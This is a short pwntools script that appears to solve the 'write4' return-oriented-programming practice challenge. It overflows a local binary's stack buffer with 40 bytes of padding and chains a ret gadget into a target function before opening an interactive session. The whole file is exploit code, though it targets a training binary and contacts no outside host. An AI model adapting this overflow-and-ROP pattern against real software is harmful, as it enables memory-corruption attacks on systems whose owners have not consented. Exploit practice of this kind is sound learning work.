from pwn import * 

p = process('./write4')

ret_gadget = 0x00000000004004e6
useful_function = 0x400617

useful_string = 0x004006b4

useful_gadget = 0x0000000000400628


payload = b'A'*40 + p64(ret_gadget) + p64(useful_function)




p.sendline(payload)
p.interactive()
